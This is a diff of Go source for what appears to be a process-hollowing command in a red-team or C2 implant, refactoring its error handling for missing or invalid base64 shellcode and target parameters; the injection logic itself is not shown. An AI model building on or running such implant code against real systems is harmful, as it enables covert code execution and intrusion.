@@ -34,45 +34,25 @@ var procVirtualProtectExHollow = kernel32.NewProc("VirtualProtectEx")
 
 func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: parameters required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: parameters required")
 	}
 
 	var params hollowParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if params.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: shellcode_b64 is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode_b64 is required")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: shellcode is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode is empty")
 	}
 
 	if params.Target == "" {
